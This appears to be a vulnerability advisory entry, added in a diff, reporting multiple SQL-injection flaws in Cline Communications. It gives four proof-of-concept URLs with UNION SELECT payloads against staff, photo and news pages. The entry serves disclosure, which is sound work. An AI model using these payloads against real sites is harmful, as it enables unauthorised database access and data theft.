@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/18491/info
+
+Cline Communications is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.
+
+A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.
+
+http://www.example.com/staff_photo_enlarged.php?Staff_ID=-1+union+select+1,2,3,4,5,6+from+Staff
+http://www.example.com/photo_enlarged.php?Photo_ID=-1+union+select+1,2,3,4,5,6,7,8,9,1+from+PHOTO
+http://www.example.com/newsdetail.php?NID=-1+union+select+1,2,3,4,5+from+News
+http://www.example.com/newsdetail.php?NID=-1+union+select+News_date,news_id,3,news_date,5+from+News
